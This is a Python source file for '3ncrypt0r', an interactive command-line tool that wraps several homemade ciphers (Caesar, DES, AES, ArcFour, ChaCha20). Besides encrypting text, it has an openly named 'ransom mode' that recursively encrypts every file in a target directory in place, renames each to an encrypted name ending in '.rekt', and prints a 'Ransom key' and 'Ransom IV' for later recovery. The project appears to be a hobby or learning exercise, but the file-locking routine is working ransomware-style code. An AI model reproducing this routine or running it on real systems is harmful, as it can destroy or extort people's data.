'''
    This module contains the running APP of the program

'''
from encodings import utf_8
from caesar_encryptor import caesar_encrypt, caesar_decrypt
from piecewise_encryptor import piecewise_encrypt, piecewise_decrypt
from des import encrypt_des, decrypt_des
from aes import aes_encrypt, aes_decrypt
from arcfour import arcfour_parse, arcfour_encrypt, arcfour_decrypt
from chacha import chacha_parse, chacha_encrypt, chacha_decrypt
from collections import Counter
from pathlib import Path

class Colours:
    '''
        Class which stores all colour codes    
    '''
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

ALPHABET = "abcdefghijklmnopqrstuvwxyz"
MODES = ["ECB", "CBC", "CTR", "PCBC", "CFB", "OFB"]
CRITICAL_FILES = [  "__init__.py", "aes.py", "des.py", "app.py", "arcfour.py",
                    'caesar_encryptor.py', 'chacha.py', 'main.py', "u",
                    'piecewise_encryptor.py']
HELP_P0 =  """
=========== [ Help Menu: Table of Contents ] ============

Table of Contents:
    Basic commands - Page 1
    Configuration  - Page 2
    Encryption     - Page 3
    Ransom Mode    - Page 4

Access a help page by using 'help' <page>
Example:
    >>> help 1

[ Page 0 ] ==============================================
"""

HELP_P1 = """
=========== [ Help Menu: Basic Commands ] ============

Basic Commands:
    - quit      <no args>   :   Terminates program
    - stdout    <no args>   :   Sets output mode to terminal
    - ransom    <no args>   :   Sets output mode to encrypt files
    - encrypt   <no args>   :   Sets mode to encrypt inputs
    - decrypt   <no args>   :   Sets mode to decrypt inputs

[ Page 1 ] ===========================================
"""

HELP_P2 = """
=========== [ Help Menu: Configuration ] =============

Configuration Commands:
    - config    <no args>   :   Outputs current configurations for chosen encryptor
    - key       <key>       :   Sets <key> as key for encryptor. 
                                <key> = 'none' will reset key to empty (default)
                                <key> should be a hexadecimal string
    - mode      <mode>      :   Sets <mode> as mode for encryptor. Valid modes are:
                                ECB (default), CBC, PCBC, CTR, CFB, OFB
                                [ only used for 'aes' and 'des']
    - IV        <iv>        :   Sets <iv> as initialisation vector for encryptor. 
                                <iv> = 'none' will reset IV to empty (default)
                                <iv> should be a hexadecimal string
    - alphabet  <alpha>     :   Sets alphabet encryptor should use.
                                [ only used for 'caesar' ]
    - whitespace <ws>       :   Indicates whether whitespace should be ignored.
                                Default is True.
                                [ only used for 'caesar' ]
    - foreign   <f_c>       :   Indicates whether foreign characters (chars not in
                                given alphabet) should be ignored or stripped.
                                Default is False.
                                [ only used for 'caesar' ]
    - case      <case>      :   Indicates whether encryptor should be case sensitive
                                [ only used for 'caesar' ]
    - offset    <offset>    :   Offset encryptor should use. 
                                [ only used for 'caesar' and 'piecewise' ]

[ Page 2 ] ===========================================
"""

HELP_P3 = """
=========== [ Help Menu: Encryption ] ================

Note:   If no IV or keys are given when in encryption mode, these will be generated
        automatically and outputted.

Encryption Commands:
    - aes       <text>      :   Switches to AES encryptor which accepts 128/256-bit
                                keys and 128-bit IV. If already switched to AES,
                                it will encrypt/decrypt <text>.
    - des       <text>      :   Switches to DES encryptor which accepts 64-bit
                                keys and 64-bit IV. If already switched to DES,
                                it will encrypt/decrypt <text>.
    - arcfour   <text>      :   Switches to ArcFour encryptor which accepts keys up to
                                40 - 2048 bits. If already switched to ArcFour
                                it will encrypt/decrypt <text>.
    - chacha    <text>      :   Switches to Chacha20 encryptor which accepts 256-bit
                                keys and 96-bit IV. If already switched to Chacha20,
                                it will encrypt/decrypt <text>.
    - caesar    <text>      :   Switches to Caesar Cipher encryptor. If already
                                switched to Caesar Cipher, it will encrypt/decrypt
                                <text>
    - piecewise <text>      :   Switches to piecewise function encryptor. If already
                                switched to piecewise function, it will encrypt/decrypt
                                <text>

[ Page 3 ] ===========================================
"""

HELP_P4 = """
=========== [ Help Menu: Ransom Mode ] ==============

Note:   If no IV or keys are given when in encryption mode, these will be generated
        automatically and outputted.

        <file> should be specified as a file_path.

Ransom Mode Commands:
    - aes       <file>      :   Switches to AES encryptor which accepts 128/256-bit
                                keys and 128-bit IV. If already switched to AES,
                                it will encrypt/decrypt <file>. If <file> is a directory
                                it will encrypt all files (excluding directories)
                                inside <file>
    - des       <file>      :   Switches to DES encryptor which accepts 64-bit
                                keys and 64-bit IV. If already switched to DES,
                                it will encrypt/decrypt <text>.If <file> is a directory
                                it will encrypt all files (excluding directories)
                                inside <file>
    - arcfour   <file>      :   Switches to ArcFour encryptor which accepts keys up to
                                40 - 2048 bits. If already switched to ArcFour
                                it will encrypt/decrypt <text>.If <file> is a directory
                                it will encrypt all files (excluding directories)
                                inside <file>
    - chacha    <file>      :   Switches to Chacha20 encryptor which accepts 256-bit
                                keys and 96-bit IV. If already switched to Chacha20,
                                it will encrypt/decrypt <text>.If <file> is a directory
                                it will encrypt all files (excluding directories)
                                inside <file>

[ Page 4 ] ===========================================
"""

HELP_PAGES = {
    '0' : HELP_P0,
    '1' : HELP_P1,
    '2' : HELP_P2,
    '3' : HELP_P3,
    '4' : HELP_P4
}

class App:

    '''
        Constructor Method for App Object
    '''
    def __init__(self):
        self._running = True
        self._mode = 'encryption'
        self._output = 'stdout'
        self._input = None
        self._algo = ""
        self._page = '0'
        self._commands = {
            'quit' : self._quit,
            'help' : self._help,
            'decrypt' : self._decrypt_mode,
            'encrypt' : self._encrypt_mode,
            'ransom' : self._ransom_mode,
            'stdout' : self._stdout_mode,
            'key' : self._set_key,
            'mode': self._set_mode,
            'IV' : self._set_IV,
            'alphabet' : self._set_alpha,
            'case' : self._set_case,
            'whitespace' : self._set_whitespace,
            'foreign' : self._set_foreign,
            'offset' : self._set_offset,
            'config' : self._config,
            'caesar' : self._caesar,
            'piecewise' : self._piecewise,
            'des' : self._des,
            'aes' : self._aes,
            'arcfour' : self._arcfour,
            'chacha' : self._chacha
        }

        self._options = {
            'key' : None,
            'offset' : None,
            'alphabet' : ALPHABET,
            'output' : "stdout",
            'IV' : None,
            'mode': "ECB",
            'keep_case' : False,
            'keep_whitespace' : True,
            'foreign_chars' : False,
            'text' : None
        }

    def _create_error_msg(self, command, message):
        return f"{Colours.FAIL}Error --> {Colours.ENDC}{command}: {message}. Please consult 'help' for more details."

    def run(self):
        '''
            Function which acts as the run loop of the app
        '''
        while self._running:
            command_line = input(f"{Colours.OKGREEN}3ncrypt0r{Colours.ENDC}:{Colours.OKCYAN}~/{self._output}/{self._mode}{self._algo}>>>{Colours.ENDC} ")
            args = self._tokenise(command_line)
            command = args[0] if len(args) != 0 else ""
            if command not in self._commands:
                if command != "":
                    print(f"No such command: '{command}'")
                continue
            self._commands[command](args)
        print(f"{Colours.WARNING}Thank you for using 3ncrypt0r!{Colours.ENDC}")

    def _tokenise(self, line):
        is_string = False
        args = []
        current_str = ""

        # Loop running through each char
        for char in line:

            # Regular split
            if char == " " and not is_string and current_str != "":
                
                # Check if the current string is a kwarg directing input/output
                if current_str.startswith("in="):
                    self._input = current_str.strip("in=")
                elif current_str.startswith("out="):
                    self._output = current_str.strip("out=")
                else:

                    # Normal string
                    args.append(current_str)
                current_str = ""
                continue

            # Detect start of string input
            if char == "\"":

                # Terminate string input and add as arg if this is the second "
                if is_string and current_str != "": 
                    args.append(current_str)
                    current_str = ""
        
                # Reverse bool flag
                is_string = not is_string
                continue
            current_str += char

        # Only append last str if it isn't empty
        if current_str != "":
            args.append(current_str)
        
        return args

    def _quit(self, *args):
        self._running = False

    def _help(self, args):
        if len(args) == 1:
            print(HELP_PAGES[self._page])
            return
        if args[1] not in HELP_PAGES:
            print(self._create_error_msg('help', 'Invalid page number. Valid page numbers are 0 - 4'))
            return
        self._page = args[1]
        print(HELP_PAGES[self._page])

    def _decrypt_mode(self, *args):
        self._mode = "decryption"

    def _encrypt_mode(self, *args):
        self._mode = "encryption"

    def _ransom_mode(self, *args):
        self._output = "ransomware"

    def _stdout_mode(self, *args):
        self._output = 'stdout'

    def _handle_dirs_e(self, encryptor, file, key, mode, IV):
        for f in file.rglob("*"):
            if f.is_dir():
                continue
            key, IV = self._encrypt_file(encryptor, f, key, mode, IV)
        return key, IV

    def _handle_dirs_d(self, decryptor, file, key, mode, IV):
        for f in file.rglob("*.rekt"):
            if f.is_dir():
                continue
            self._decrypt_file(decryptor, f, key, mode, IV)

    def _encrypt_file(self, encryptor, file, *args):
        # Check for shielding
        if file.name in CRITICAL_FILES:
            print(self._create_error_msg(self._algo.strip("/"), f"Attempted to encrypt critical program file '{file.name}'"))
            return None, None

        # Reading file data
        with open(file, 'rb') as r_file:
            file_bytes = bytearray(r_file.read())
            ciphertext, key, iv = encryptor(file_bytes, key=args[0], mode=args[1], IV=args[2], ransom=True)

        # Overwriting actual file
        cipher_filename, key, iv = encryptor(file.name, key=key, mode=args[1], IV=iv)
        print(file.name, cipher_filename)
        new_path = Path(file.parent, f"{cipher_filename}.rekt")
        file.rename(new_path)
        with open(new_path, 'wb') as new_file:
            new_file.write(bytearray.fromhex(ciphertext))
        return key, iv

    def _decrypt_file(self, decryptor, file, *args):
        # Reading file data
        with open(file, 'rb') as d_file:
            file_bytes = bytearray(d_file.read())
            plaintext = decryptor(file_bytes, args[0], mode=args[1], IV=args[2], ransom=True)

        # Overwriting actual file
        filename = decryptor(file.stem, args[0], mode=args[1], IV=args[2])
        new_path = Path(file.parent, f"{filename}")
        file.rename(new_path)
        with open(new_path, 'wb') as new_file:
            new_file.write(plaintext)

    def _set_key(self, args):
        # Handle errors:
        if len(args) < 2:
            print(self._create_error_msg("key", "No key given"))
            return
        if args[1].lower() == "none":
            self._options['key'] = None
            return
        try:
            int(args[1], 16)
        except ValueError:
            print(self._create_error_msg("key", "Non-hexadecimal key given"))
            return
        self._options['key'] = args[1]

    def _set_IV(self, args):
        # Handle errors:
        if len(args) < 2:
            print(self._create_error_msg("IV", "No IV given"))
            return
        if args[1].lower() == "none":
            self._options['IV'] = None
            return        
        try:
            int(args[1], 16)
        except ValueError:
            print(self._create_error_msg("IV", "Non-hexadecimal IV given"))
            return
        self._options['IV'] = args[1]

    def _set_mode(self, args):
        if len(args) < 2:
            print(self._create_error_msg("mode", "No mode given"))
        elif args[1] not in MODES:
            print(self._create_error_msg("mode", f"Invalid mode. Please choose from {', '.join(MODES)}"))
        else:
            self._options['mode'] = args[1]

    def _set_alpha(self, args):
        if len(args) < 2:
            print(self._create_error_msg("alphabet", "No alphabet given"))
            return
        
        #Check for duplicates
        duplicates = Counter(args[1])
        dupe = False
        for key, val in duplicates.items():
            if val > 1:
                dupe = True
                break
        if dupe:
            print(self._create_error_msg("alphabet", f"Duplicate character '{key}' in alphabet"))
        else:
            self._options['alphabet'] = args[1]

    def _set_case(self, args):
        if len(args) < 2:
            print(self._create_error_msg("case", "No case option given"))
        elif args[1].lower() not in ["true", 'false']:
            print(self._create_error_msg("case", "Invalid input. Valid inputs are: True, False"))
        else:
            self._options['keep_case'] = True if args[1].lower() == "true" else False

    def _set_whitespace(self, args):
        if len(args) < 2:
            print(self._create_error_msg("whitespace", "No whitespace option given"))
        elif args[1].lower() not in ["true", 'false']:
            print(self._create_error_msg("whitespace", "Invalid input. Valid options are: True, False"))
        else:
            self._options['whitespace'] = True if args[1].lower() == "true" else False

    def _set_foreign(self, args):
        if len(args) < 2:
            print(self._create_error_msg("foreign", "No foreign option given"))
        elif args[1].lower() not in ["true", 'false']:
            print(self._create_error_msg("foreign", "Invalid input. Valid options are: True, False"))
        else:
            self._options['foreign'] = True if args[1].lower() == "true" else False

    def _set_offset(self, args):
        if len(args) < 2:
            print(self._create_error_msg("offset", "No offset given"))
            return
        try:
            self._options['offset'] = int(args[1])
        except ValueError:
            print(self._create_error_msg("offset", "Non-decimal offset given"))

    def _config(self, *args):
        print(f"===== {self._mode.capitalize()} Config =====")
        if self._algo in ["/caesar", "/piecewise"]:
            print(f"Offset: {self._options['offset']}")
        if self._algo == "/caesar":
            print(f"Alphabet: {self._options['alphabet']}")
            print(f"Case Sensitive: {self._options['keep_case']}")
            print(f"Whitespace: {self._options['keep_whitespace']}")
            print(f"Foreign Characters: {self._options['foreign_chars']}")
        elif self._algo in ["/des", "/aes"]:
            print(f"Key: {self._options['key']}")
            print(f"Mode: {self._options['mode']}")
            print(f"IV (only for non-ECB mode): {self._options['IV']}")
        elif self._algo in ['/arcfour', '/chacha']:
            print(f"Key: {self._options['key']}")
            print(f"Seed (chacha only): {self._options['IV']}")
        if self._algo == "":
            print("No encryption mode selected!")
        print("=============================")

    def _caesar(self, args):
        if self._algo != "/caesar":
            self._algo = "/caesar"
            self._config(args)
            return
        if len(args) < 2:
            print(self._create_error_msg("caesar", "No text to encrypt"))
            return
        if self._output == "ransomware":
            print(self._create_error_msg("caesar", "Cannot encrypt file(s) using caesar"))
            return
        offset = self._options['offset'] if self._options['offset']is not None else 7
        alphabet = self._options['alphabet']
        if self._mode == "encryption":
            ciphertext = caesar_encrypt(args[1], offset, alphabet,
                                        keep_case=self._options['keep_case'],
                                        whitespace=self._options['keep_whitespace'],
                                        special_chars=self._options['foreign_chars'])
            print(f"Encrypted text: {ciphertext}")
        else:
            try:
                plaintext = caesar_decrypt(args[1], offset, self._options['alphabet'],
                                        keep_case=self._options['keep_case'],
                                        whitespace=self._options['keep_whitespace'],
                                        special_chars=self._options['foreign_chars'])
                print(f"Decrypted text: {plaintext}")
            except:
                print(self._create_error_msg("caesar", "There was an error in decryption. Check your ciphertext!"))

    def _piecewise(self, args):
        if self._algo != "/piecewise":
            self._algo = "/piecewise"
            self._config(args)
            return
        if len(args) < 2:
            print(self._create_error_msg("piecewise", "No text to encrypt"))
            return
        if self._output == "ransomware":
            print(self._create_error_msg("piecewise", "Cannot encrypt file(s) using piecewise"))
            return
        offset = self._options['offset'] if self._options['offset']is not None else 0
        if self._mode == "encryption":
            print(f"Encrypted text: {piecewise_encrypt(args[1], offset=offset)}")
        else:
            try:
                print(f"Decrypted text: {piecewise_decrypt(args[1], offset=offset)}")
            except:
                print(self._create_error_msg("piecewise", "There was an error in decryption. Check your ciphertext!"))

    def _des(self, args):
        if self._algo != "/des":
            self._algo = "/des"
            self._config(args)
            return
        if len(args) < 2:
            print(self._create_error_msg("des", "No text to encrypt"))
            return
        key = self._options['key']
        IV = self._options['IV']
        mode = self._options['mode']
        if key is not None and len(key) != 16:
            print(self._create_error_msg("des", f"Invalid key length of {len(key)}. Key should be 16 characters long"))
            return
        if IV is not None and len(IV) != 16:
            print(self._create_error_msg("des", f"Invalid IV length of {len(IV)}. IV should be 16 characters long"))
            return

        if self._output == "ransomware":
            print(f"Initiating ransomware mode: Target: {args[1]}")
            file = Path(args[1])
            if not file.exists():
                print(self._create_error_msg("des", f"File path {args[1]} not found"))
                return
            if self._mode == "encryption":
                if file.is_dir():
                    key, iv = self._handle_dirs_e(encrypt_des, file, key, mode, IV)
                else:
                    key, iv = self._encrypt_file(encrypt_des, file, key, mode, IV)
                print(f"Ransom key: {key}\nRansom IV: {iv}")

            else:
                if file.is_dir():
                    self._handle_dirs_d(decrypt_des, file, key, mode, IV)
                else:
                    self._decrypt_file(decrypt_des, file, key, mode, IV)
        else:
            if self._mode == "encryption":
                ciphertext, key, iv = encrypt_des(args[1], key=key, mode=mode, IV=IV)
                print(f"Your encrypted text is: {ciphertext}\nYour key is: {key} - don't lose this!\nYour IV is: {iv}")
            elif self._mode == "decryption":
                try:
                    int(args[1], 16)
                except:
                    print(self._create_error_msg("des", "Ciphertext is not in hexadecimal form"))
                    return
                if key is None or (IV is None and mode != "ECB"):
                    print(self._create_error_msg("des", "Key or IV not supplied for decryption"))
                    return
                try:
                    print(f"Decrypted text: {decrypt_des(args[1], key=key, mode=mode, IV=IV)}")
                except:
                    print(self._create_error_msg("des", "There was an error in decryption. Check your ciphertext!"))

    def _aes(self, args):
        if self._algo != "/aes":
            self._algo = "/aes"
            self._config(args)
            return
        if len(args) < 2:
            print(self._create_error_msg("aes", "No text to encrypt"))
            return
        key = self._options['key']
        IV = self._options['IV']
        mode = self._options['mode']
        if key is not None and len(key) not in [32, 48, 64]:
            print(self._create_error_msg("aes", f"Invalid key length of {len(key)}. Key should be 32, 48 or 64 characters long"))
            return
        if IV is not None and len(IV) != 32:
            print(self._create_error_msg("aes", f"Invalid IV length of {len(IV)}. IV should be 32 characters long"))
            return

        if self._output == "ransomware":
            print(f"Initiating ransomware mode: Target: {args[1]}")
            file = Path(args[1])
            if not file.exists():
                print(self._create_error_msg("aes", f"File path {args[1]} not found"))
                return

            if self._mode == "encryption":
                if file.is_dir():
                    key, iv = self._handle_dirs_e(aes_encrypt, file, key, mode, IV)
                else:
                    key, iv = self._encrypt_file(aes_encrypt, file, key, mode, IV)
                print(f"Ransom key: {key}\nRansom IV: {iv}")

            else:
                if file.is_dir():
                    self._handle_dirs_d(aes_decrypt, file, key, mode, IV)
                else:
                    self._decrypt_file(aes_decrypt, file, key, mode, IV)
        else:
            if self._mode == "encryption":
                ciphertext, key, iv = aes_encrypt(args[1], key=key, mode=mode, IV=IV)
                print(f"Your encrypted text is: {ciphertext}\nYour key is: {key} - don't lose this!\nYour IV is: {iv}")
            else:
                try:
                    int(args[1], 16)
                except:
                    print(self._create_error_msg("aes", "Ciphertext is not in hexadecimal form"))
                    return
                if key is None or (IV is None and mode != "ECB"):
                    print(self._create_error_msg("aes", "Key or IV not supplied for decryption"))
                    return
                try:
                    print(f"Decrypted text: {aes_decrypt(args[1], key=key, mode=mode, IV=IV)}")
                except:
                    print(self._create_error_msg("aes", "There was an error in decryption. Check your ciphertext!"))

    def _arcfour(self, args):
        if self._algo != "/arcfour":
            self._algo = "/arcfour"
            self._config(args)
            return
        if len(args) < 2:
            print(self._create_error_msg("arcfour", "No text/file to encrypt"))
            return
        key = self._options['key']
        if key is not None and len(key) not in [32, 64]:
            print(self._create_error_msg("arcfour", f"Invalid key length of {len(key)}. Key should be 32 or 64 characters long"))
            return
        
        if self._output == "ransomware":
            print(f"Initiating ransomware mode: Target: {args[1]}")
            file = Path(args[1])
            if not file.exists():
                print(self._create_error_msg("arcfour", f"File path {args[1]} not found"))
                return

            if self._mode == "encryption":
                if file.is_dir():
                    key, iv = self._handle_dirs_e(arcfour_encrypt, file, key, None, None)
                else:
                    key, iv = self._encrypt_file(arcfour_encrypt, file, key, None, None)
                print(f"Ransom key: {key}\nRansom IV: {iv}")

            else:
                if file.is_dir():
                    self._handle_dirs_d(arcfour_decrypt, file, key, None, None)
                else:
                    self._decrypt_file(arcfour_decrypt, file, key, None, None)
        else:
            if self._mode == "encryption":
                ciphertext, key = arcfour_parse(args[1], key=key)
                print(f"Your encrypted text is: {ciphertext}\nYour key is: {key} - don't lose this!")
            else:
                try:
                    int(args[1], 16)
                except:
                    print(self._create_error_msg("arcfour", "Ciphertext is not in hexadecimal form"))
                    return
                if key is None:
                    print(self._create_error_msg("arcfour", "Key or IV not supplied for decryption"))
                    return
                try:
                    print(f"Decrypted text: {arcfour_parse(args[1], key=key, decrypt=True)}")
                except:
                    print(self._create_error_msg("arcfour", "There was an error in decryption. Check your ciphertext!"))

    def _chacha(self, args):
        if self._algo != "/chacha":
            self._algo = "/chacha"
            self._config(args)
            return
        if len(args) < 2:
            print(self._create_error_msg("chacha", "No text/file to encrypt"))
            return
        key = self._options['key']
        iv = self._options['IV']
        if key is not None and len(key) != 64:
            print(self._create_error_msg("chacha", f"Invalid key length of {len(key)}. Key should be 64 characters long"))
            return
        if iv is not None and len(iv) != 24:
            print(self._create_error_msg("chacha", f"Invalid key length of {len(iv)}. Key should be 24 characters long"))
            return
        if self._output == "ransomware":
            print(f"Initiating ransomware mode: Target: {args[1]}")
            file = Path(args[1])
            if not file.exists():
                print(self._create_error_msg("chacha", f"File path {args[1]} not found"))
                return

            if self._mode == "encryption":
                if file.is_dir():
                    key, iv = self._handle_dirs_e(chacha_encrypt, file, key, None, iv)
                else:
                    key, iv = self._encrypt_file(chacha_encrypt, file, key, None, iv)
                print(f"Ransom key: {key}\nRansom IV: {iv}")

            else:
                if key is None or iv is None:
                    print(self._create_error_msg("chacha", "Key or IV not supplied for decryption"))
                    return
                
                if file.is_dir():
                    self._handle_dirs_d(chacha_decrypt, file, key, None, iv)
                else:
                    self._decrypt_file(chacha_decrypt, file, key, None, iv)
        else:
            if self._mode == "encryption":
                ciphertext, key, iv = chacha_parse(args[1], key=key, IV=iv)
                print(f"Your encrypted text is: {ciphertext}\nYour key is: {key} - don't lose this!\nYour IV is: {iv}")
            else:
                try:
                    int(args[1], 16)
                except:
                    print(self._create_error_msg("chacha", "Ciphertext is not in hexadecimal form"))
                    return
                if key is None or iv is None:
                    print(self._create_error_msg("chacha", "Key or IV not supplied for decryption"))
                    return
                try:
                    print(f"Decrypted text: {chacha_parse(args[1], key=key, IV=iv, decrypt=True)}")
                except:
                    print(self._create_error_msg("chacha", "There was an error in decryption. Check your ciphertext!"))
